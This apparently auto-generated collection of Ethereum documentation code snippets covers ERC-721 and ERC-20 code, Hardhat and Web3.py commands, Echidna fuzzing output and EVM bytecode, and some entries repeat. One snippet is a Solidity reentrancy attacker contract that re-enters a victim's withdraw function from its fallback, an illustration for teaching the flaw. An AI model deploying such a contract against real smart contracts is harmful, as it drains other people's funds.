localhost:8545\n{\"id\":6,\"jsonrpc\":\"2.0\",\"result\":\"0xe1f3095770633ab2b18081658bad475439f6a08c902d0915903bafff06e6febf\"}\n```\n\n----------------------------------------\n\nTITLE: Exibindo a ABI do contrato no console\nDESCRIPTION: Imprime a ABI do contrato NFT em formato JSON no console para fins de depuração e verificação.\n\nLANGUAGE: javascript\nCODE:\n```\nconsole.log(JSON.stringify(contract.abi))\n```\n\n----------------------------------------\n\nTITLE: Implementing approve Method in Vyper ERC-721\nDESCRIPTION: This method approves a specific address to transfer a specific token. It includes security checks to ensure the token exists, the approver is authorized, and the approved address is not the current owner.\n\nLANGUAGE: vyper\nCODE:\n```\n@external\ndef approve(_approved: address, _tokenId: uint256):\n    \"\"\"\n    @dev Set or reaffirm the approved address for an NFT. The zero address indicates there is no approved address.\n         Throws unless `msg.sender` is the current NFT owner, or an authorized operator of the current owner.\n         Throws if `_tokenId` is not a valid NFT. (NOTE: This is not written the EIP)\n         Throws if `_approved` is the current owner. (NOTE: This is not written the EIP)\n    @param _approved Address to be approved for the given NFT ID.\n    @param _tokenId ID of the token to be approved.\n    \"\"\"\n    owner: address = self.idToOwner[_tokenId]\n    # Throws if `_tokenId` is not a valid NFT\n    assert owner != ZERO_ADDRESS\n    # Throws if `_approved` is the current owner\n    assert _approved != owner\n```\n\n----------------------------------------\n\nTITLE: Defining ERC-721 Interface ID Constant in Vyper\nDESCRIPTION: Declares the ERC-721 interface ID constant as required by ERC-165 for interface detection. This constant allows other contracts to identify this contract as ERC-721 compliant.\n\nLANGUAGE: vyper\nCODE:\n```\n# @dev ERC165 interface ID of ERC721\nERC721_INTERFACE_ID: constant(bytes32) = 0x0000000000000000000000000000000000000000000000000000000080ac58cd\n```\n\n----------------------------------------\n\nTITLE: Testing Value Encoding for Cache\nDESCRIPTION: Test function that uses encodeVal() to automatically determine how to encode values for the cache based on whether they're already cached.\n\nLANGUAGE: solidity\nCODE:\n```\n    function testEncodeVal() public {\n        .\n        .\n        .\n        _callInput = bytes.concat(\n            FOUR_PARAMS,\n            cache.encodeVal(VAL_A),\n            cache.encodeVal(VAL_B),\n            cache.encodeVal(VAL_C),\n            cache.encodeVal(VAL_D)\n        );\n        .\n        .\n        .\n        assertEq(_callInput.length, 4+1*4);\n    }   // testEncodeVal\n```\n\n----------------------------------------\n\nTITLE: Implementing Account Freezing Function with Owner Restriction\nDESCRIPTION: Function declaration for freezing accounts that includes the onlyOwner modifier from OpenZeppelin's Ownable contract to restrict execution to the contract owner only.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction freezeAccount(address addr)\n  public\n  onlyOwner\n```\n\n----------------------------------------\n\nTITLE: Running Tests Against Local Network\nDESCRIPTION: Command to run tests for the ChipToken contract against the local Ethereum testnet. This demonstrates how to execute contract tests in a local environment before deploying to a public network.\n\nLANGUAGE: python\nCODE:\n```\nnpx hardhat test --network localnet\n```\n\n----------------------------------------\n\nTITLE: Obtendo Lista de Contas Ethereum com Web3.py\nDESCRIPTION: Recupera a lista de contas disponíveis no ambiente de teste. O provedor de teste cria automaticamente várias contas pré-carregadas com ether.\n\nLANGUAGE: python\nCODE:\n```\nw3.eth.accounts\n```\n\n----------------------------------------\n\nTITLE: Testing Value Encoding with Cache in Solidity\nDESCRIPTION: Test function for the encodeVal function which handles the encoding of values for the cache, checking that values are properly encoded.\n\nLANGUAGE: solidity\nCODE:\n```\n    function testEncodeVal() public {\n        .\n        .\n        .\n        _callInput = bytes.concat(\n            FOUR_PARAMS,\n            cache.encodeVal(VAL_A),\n            cache.encodeVal(VAL_B),\n            cache.encodeVal(VAL_C),\n            cache.encodeVal(VAL_D)\n        );\n        .\n        .\n        .\n        assertEq(_callInput.length, 4+1*4);\n    }   // testEncodeVal\n```\n\n----------------------------------------\n\nTITLE: Compiling a Solidity Smart Contract with Hardhat\nDESCRIPTION: Command to compile the Solidity smart contract using Hardhat, which converts the Solidity code into bytecode that can be deployed to the Ethereum blockchain.\n\nLANGUAGE: bash\nCODE:\n```\nnpx hardhat compile\n```\n\n----------------------------------------\n\nTITLE: Running Echidna with Seeded Corpus\nDESCRIPTION: Command output showing Echidna successfully finding the property violation after the corpus was manually seeded with the correct magic values.\n\nLANGUAGE: bash\nCODE:\n```\nechidna-test magic.sol --config config.yaml\n...\nechidna_magic_values: failed!💥\n  Call sequence:\n    magic(42,129,333,0)\n\n\nUnique instructions: 142\nUnique codehashes: 1\nSeed: -7293830866560616537\n```\n\n----------------------------------------\n\nTITLE: Implementace útočného kontraktu pro reentrancy útok v Solidity\nDESCRIPTION: Útočný smart kontrakt navržený k exploitaci zranitelnosti reentrancy v zranitelném kontraktu. Kontrakt provede počáteční vklad, zavolá withdraw funkci a poté využije fallback funkci k opakovanému volání withdraw před dokončením původní transakce.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract Attacker {\n    function beginAttack() external payable {\n        Victim(victim_address).deposit.value(1 ether)();\n        Victim(victim_address).withdraw();\n    }\n\n    function() external payable {\n        if (gasleft() > 40000) {\n            Victim(victim_address).withdraw();\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Echidna Corpus Transaction Example\nDESCRIPTION: Example of a JSON file generated by Echidna in the corpus directory, showing the structure of a recorded transaction that was used during fuzzing.\n\nLANGUAGE: json\nCODE:\n```\n[\n  {\n    \"_gas'\": \"0xffffffff\",\n    \"_delay\": [\"0x13647\", \"0xccf6\"],\n    \"_src\": \"00a329c0648769a73afac7f9381e08fb43dbea70\",\n    \"_dst\": \"00a329c0648769a73afac7f9381e08fb43dbea72\",\n    \"_value\": \"0x0\",\n    \"_call\": {\n      \"tag\": \"SolCall\",\n      \"contents\": [\n        \"magic\",\n        [\n          {\n            \"contents\": [\n              256,\n              \"93723985220345906694500679277863898678726808528711107336895287282192244575836\"\n            ],\n            \"tag\": \"AbiUInt\"\n          },\n          {\n            \"contents\": [256, \"334\"],\n            \"tag\": \"AbiUInt\"\n          },\n          {\n            \"contents\": [\n              256,\n              \"68093943901352437066264791224433559271778087297543421781073458233697135179558\"\n            ],\n            \"tag\": \"AbiUInt\"\n          },\n          {\n            \"tag\": \"AbiUInt\",\n            \"contents\": [256, \"332\"]\n          }\n        ]\n      ]\n    },\n    \"_gasprice'\": \"0xa904461f1\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: ABI Method Signature Comparison in EVM Bytecode\nDESCRIPTION: Bytecode that compares the extracted function signature with known method signatures. This implementation optimizes the comparison by first checking if the signature is greater than a specific value, reducing the number of comparisons needed on average.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\n13 | DUP1                | (((first 32 bits (4 bytes) of the call data))) (((first 32 bits (4 bytes) of the call data)))\n14 | PUSH4 0x3cd8045e    | 0x3CD8045E (((first 32 bits (4 bytes) of the call data))) (((first 32 bits (4 bytes) of the call data)))\n19 | GT                  | 0x3CD8045E>first-32-bits-of-the-call-data (((first 32 bits (4 bytes) of the call data)))\n1A | PUSH2 0x0043        | 0x43 0x3CD8045E>first-32-bits-of-the-call-data (((first 32 bits (4 bytes) of the call data)))\n1D | JUMPI               | (((first 32 bits (4 bytes) of the call data)))\n```\n\n----------------------------------------\n\nTITLE: Testing with Simple Mock Return Values\nDESCRIPTION: Test case that mocks the ERC20 balanceOf function to return a specific value, and verifies the contract's check function returns the expected boolean result.\n\nLANGUAGE: typescript\nCODE:\n```\nit(\"returns false if the wallet has less than 1000000 tokens\", async () => {\n  await mockERC20.mock.balanceOf.returns(utils.parseEther(\"999999\"))\n  expect(await contract.check()).to.be.equal(false)\n})\n```\n\n----------------------------------------\n\nTITLE: Checking Maximum Withdrawal Limit in ERC-4626 Vault\nDESCRIPTION: The maxWithdraw function returns the maximum amount of underlying assets that can be withdrawn by a specific owner in a single withdraw call.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction maxWithdraw(address owner) public view returns (uint256 maxAssets)\n```\n\n----------------------------------------\n\nTITLE: Using Hook Before Token Transfer in ERC-20\nDESCRIPTION: Calls the _beforeTokenTransfer hook function which can be overridden by inheriting contracts to execute custom logic before any token transfer occurs.\n\nLANGUAGE: solidity\nCODE:\n```\n_beforeTokenTransfer(sender, recipient, amount);\n```\n\n----------------------------------------\n\nTITLE: Retrieving Wallet Balance using Ethereum JSON-RPC\nDESCRIPTION: Example response from an eth_getBalance JSON-RPC request that returns the current balance of an Ethereum wallet in wei format. This shows the expected format when checking your wallet balance through Alchemy's composer tool.\n\nLANGUAGE: json\nCODE:\n```\n{ \"jsonrpc\": \"2.0\", \"id\": 0, \"result\": \"0x2B5E3AF16B1880000\" }\n```\n\n----------------------------------------\n\nTITLE: REVERT Opcode Implementation (0xFD)\nDESCRIPTION: Reverts execution with data from memory. Stops execution and returns state to before the current execution with optional return data.\n\nLANGUAGE: solidity\nCODE:\n```\nrevert(mem[ost:ost+len-1])\n```\n\n----------------------------------------\n\nTITLE: Nethermind Mainnet Configuration File Path\nDESCRIPTION: The file path for the Nethermind Ethereum client's mainnet configuration file.\n\nLANGUAGE: bash\nCODE:\n```\n/etc/nethermind/configs/mainnet.cfg\n```\n\n----------------------------------------\n\nTITLE: Creating Environment Variables File for Ethereum Project\nDESCRIPTION: Example of an .env file structure for storing Alchemy API URL and MetaMask private key. These credentials are used for connecting to the Ethereum network and signing transactions.\n\nLANGUAGE: plaintext\nCODE:\n```\nAPI_URL = \"https://eth-goerli.alchemyapi.io/v2/your-api-key\"\nPRIVATE_KEY = \"your-metamask-private-key\"\n```\n\n----------------------------------------\n\nTITLE: Using Apollo's useQuery Hook with React\nDESCRIPTION: Example of using Apollo's useQuery hook with React's useEffect to fetch data from a GraphQL endpoint. This code demonstrates how to handle loading states, errors, and process returned data.\n\nLANGUAGE: javascript\nCODE:\n```\nconst { loading, error, data } = useQuery(myGraphQlQuery)\n\nReact.useEffect(() => {\n  if (!loading && !error && data) {\n    console.log({ data })\n  }\n}, [loading, error, data])\n```\n\n----------------------------------------\n\nTITLE: Retrieving Wallet Balance using Ethereum JSON-RPC\nDESCRIPTION: Example response from an eth_getBalance JSON-RPC request that returns the current balance of an Ethereum wallet in wei format. This shows the expected format when checking your wallet balance through Alchemy's composer tool.\n\nLANGUAGE: json\nCODE:\n```\n{ \"jsonrpc\": \"2.0\", \"id\": 0, \"result\": \"0x2B5E3AF16B1880000\" }\n```\n\n----------------------------------------\n\nTITLE: Retrieving Wallet Balance using Ethereum JSON-RPC\nDESCRIPTION: Example response from an eth_getBalance JSON-RPC request that returns the current balance of an Ethereum wallet in wei format. This shows the expected format when checking your wallet balance through Alchemy's composer tool.\n\nLANGUAGE: json\nCODE:\n```\n{ \"jsonrpc\": \"2.0\", \"id\": 0, \"result\": \"0x2B5E3AF16B1880000\" }\n```\n\n----------------------------------------\n\nTITLE: Implementing WORM Cache Operations in JavaScript\nDESCRIPTION: Core implementation of the WORM cache operations including generating unique keys, encoding values, preparing calldata for transactions, and reading cached entries. The code demonstrates how to handle both cached and direct function calls.\n\nLANGUAGE: javascript\nCODE:\n```\nconst main = async () => {\n    const func = await worm.WRITE_ENTRY_CACHED()\n\n    // Need a new key every time\n    const key = await worm.encodeVal(Number(new Date()))\n\nconst val = await worm.encodeVal(\"0x600D\")\n\n// Write an entry\nconst calldata = func + key.slice(2) + val.slice(2)\n\nconst tx = await worm.populateTransaction.writeEntryCached()\ntx.data = calldata\n\nsentTx = await wallet.sendTransaction(tx)\n    .\n    .\n    .\n    // Read the entry just written\n    const realKey = '0x' + key.slice(4)  // remove the FF flag\n    const entryRead = await worm.readEntry(realKey)\n    .\n    .\n    .\n```\n\n----------------------------------------\n\nTITLE: Merkle Proof Verification in Python Decompiled from Solidity\nDESCRIPTION: A code snippet that verifies a merkle proof submitted during claim processing. It loops through the proof array to reconstruct and validate against the stored merkle root.\n\nLANGUAGE: python\nCODE:\n```\n  ...\n  idx = 0\n  s = 0\n  while idx < _param4.length:\n  ...\n      if s + sha3(mem[(32 * _param4.length) + 328 len mem[(32 * _param4.length) + 296]]) > mem[(32 * idx) + 296]:\n          mem[mem[64] + 32] = mem[(32 * idx) + 296]\n          ...\n          s = sha3(mem[_62 + 32 len mem[_62]])\n          continue\n      ...\n      s = sha3(mem[_66 + 32 len mem[_66]])\n      continue\n  if unknown2eb4a7ab != s:\n      revert with 0, 'Invalid proof'\n```\n\n----------------------------------------\n\nTITLE: Rendering Translation Progress Chart\nDESCRIPTION: Component that visualizes the progress of translations across different languages on ethereum.org. This component likely generates a chart or graph showing translation completion statistics.\n\nLANGUAGE: html\nCODE:\n```\n<TranslationChartImage />\n```\n\n----------------------------------------\n\nTITLE: Echidna Corpus Transaction Example\nDESCRIPTION: Example of a JSON file generated by Echidna in the corpus directory, showing the structure of a recorded transaction that was used during fuzzing.\n\nLANGUAGE: json\nCODE:\n```\n[\n  {\n    \"_gas'\": \"0xffffffff\",\n    \"_delay\": [\"0x13647\", \"0xccf6\"],\n    \"_src\": \"00a329c0648769a73afac7f9381e08fb43dbea70\",\n    \"_dst\": \"00a329c0648769a73afac7f9381e08fb43dbea72\",\n    \"_value\": \"0x0\",\n    \"_call\": {\n      \"tag\": \"SolCall\",\n      \"contents\": [\n        \"magic\",\n        [\n          {\n            \"contents\": [\n              256,\n              \"93723985220345906694500679277863898678726808528711107336895287282192244575836\"\n            ],\n            \"tag\": \"AbiUInt\"\n          },\n          {\n            \"contents\": [256, \"334\"],\n            \"tag\": \"AbiUInt\"\n          },\n          {\n            \"contents\": [\n              256,\n              \"68093943901352437066264791224433559271778087297543421781073458233697135179558\"\n            ],\n            \"tag\": \"AbiUInt\"\n          },\n          {\n            \"tag\": \"AbiUInt\",\n            \"contents\": [256, \"332\"]\n          }\n        ]\n      ]\n    },\n    \"_gasprice'\": \"0xa904461f1\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Displaying AI Agent Cards Using CardGrid Component in JSX\nDESCRIPTION: A JSX component that displays a grid of cards highlighting different AI agent capabilities including automated DeFi, the AI agent economy, and risk management.\n\nLANGUAGE: jsx\nCODE:\n```\n<CardGrid className=\"grid grid-cols-[repeat(auto-fill,_minmax(min(100%,_280px),_1fr))] gap-8\">\n  <Card title=\"Automated DeFi\" emoji=\":money_with_wings:\" description=\"AI agents keep a close eye on market trends, execute trades, and manage portfolios — making the complex world of DeFi a lot more approachable.\"/>\n  <Card title=\"New AI agent economy\" emoji=\"🌎\" description=\"AI agents can hire other agents (or humans) with different skills to perform specialized tasks for them.\" />\n  <Card title=\"Risk management\" emoji=\"🛠️\" description=\"By monitoring transactional activities, AI agents can help spot scams and safeguard your digital assets better and faster.\" />\n</CardGrid>\n```\n\n----------------------------------------\n\nTITLE: Implementing UniswapV2Factory Contract State Variables in Solidity\nDESCRIPTION: These state variables define the core storage structure of the UniswapV2Factory contract. They track protocol fee destinations, pair trading contracts mapping, and store all created pair addresses in an array for reference.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity =0.5.16;\n\nimport './interfaces/IUniswapV2Factory.sol';\nimport './UniswapV2Pair.sol';\n\ncontract UniswapV2Factory is IUniswapV2Factory {\n    address public feeTo;\n    address public feeToSetter;\n\n    mapping(address => mapping(address => address)) public getPair;\n    address[] public allPairs;\n```\n\n----------------------------------------\n\nTITLE: Verificando Conexão do Web3.py com o Nó Ethereum\nDESCRIPTION: Um simples teste que verifica se a instância Web3.py está corretamente conectada ao provedor Ethereum.\n\nLANGUAGE: python\nCODE:\n```\nw3.is_connected()\n```\n\n----------------------------------------\n\nTITLE: Implementing getCurrentWalletConnected Function for Persistent Connection\nDESCRIPTION: This function checks if a wallet is already connected to the dApp. It uses the eth_accounts method instead of eth_requestAccounts to get currently connected accounts without prompting the user for connection.\n\nLANGUAGE: javascript\nCODE:\n```\nexport const getCurrentWalletConnected = async () => {\n  if (window.ethereum) {\n    try {\n      const addressArray = await window.ethereum.request({\n        method: \"eth_accounts\",\n      })\n      if (addressArray.length > 0) {\n        return {\n          address: addressArray[0],\n          status: \"👆🏽 Write a message in the text-field above.\",\n        }\n      } else {\n        return {\n          address: \"\",\n          status: \"🦊 Connect to MetaMask using the top right button.\",\n        }\n      }\n    } catch (err) {\n      return {\n        address: \"\",\n        status: \"😥 \" + err.message,\n      }\n    }\n  } else {\n    return {\n      address: \"\",\n      status: (\n        <span>\n          <p>\n            {\" \"}\n            🦊 <a target=\"_blank\" href={`https://metamask.io/download.html`}>\n              You must install MetaMask, a virtual Ethereum wallet, in your\n              browser.\n            </a>\n          </p>\n        </span>\n      ),\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Revert Logic in Function 0x81e580d3\nDESCRIPTION: This code segment handles the revert process when the calldata size validation fails. It reverts the transaction without returning any data.\n\nLANGUAGE: evm\nCODE:\n```\n19D | DUP1                | 0x00 0x00 0x04 CALLDATASIZE 0x0153 0xDA      |\n19E | DUP2                | 0x00 0x00 0x00 0x04 CALLDATASIZE 0x0153 0xDA |\n19F | REVERT              |                                              |\n```\n\n----------------------------------------\n\nTITLE: Implementing InfoBanner Component for ETH Issuance Information\nDESCRIPTION: A React/JSX component displaying an informational banner about ETH issuance changes after The Merge, with a link to additional resources explaining issuance mechanics before and after the transition.\n\nLANGUAGE: jsx\nCODE:\n```\n<InfoBanner>\nThis transition to proof-of-stake changed the way ether is issued. Learn more about <a href=\"/roadmap/merge/issuance/\">ether issuance before and after The Merge</a>.\n</InfoBanner>\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode for Token Contract Implementation\nDESCRIPTION: Ethereum Virtual Machine bytecode representing a token contract, including operations for transfers, allowances, and balance management. The bytecode includes function signatures, stack manipulations, and memory access patterns that implement standard ERC-20 functionality.\n\nLANGUAGE: evm-bytecode\nCODE:\n```\n0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x83B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x452 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x41C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x908 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x4CE PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x482 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x926 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x60 PUSH1 0x3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x57C JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x551 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x57C JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x55F JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x59A PUSH2 0x593 PUSH2 0x9AD JUMP JUMPDEST DUP5 DUP5 PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5BB DUP5 DUP5 DUP5 PUSH2 0xBAC JUMP JUMPDEST PUSH2 0x67C DUP5 PUSH2 0x5C7 PUSH2 0x9AD JUMP JUMPDEST PUSH2 0x677 DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1026 PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x0 DUP12 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x62D PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x747 PUSH2 0x6AB PUSH2 0x9AD JUMP JUMPDEST DUP5 PUSH2 0x742 DUP6 PUSH1 0x1 PUSH1 0x0 PUSH2 0x6BC PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP10 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xF2D SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x831 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x806 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x831 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x814 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x8FE PUSH2 0x848 PUSH2 0x9AD JUMP JUMPDEST DUP5 PUSH2 0x8F9 DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1097 PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x0 PUSH2 0x872 PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP11 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x91C PUSH2 0x915 PUSH2 0x9AD JUMP JUMPDEST DUP5 DUP5 PUSH2 0xBAC JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xA3B JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 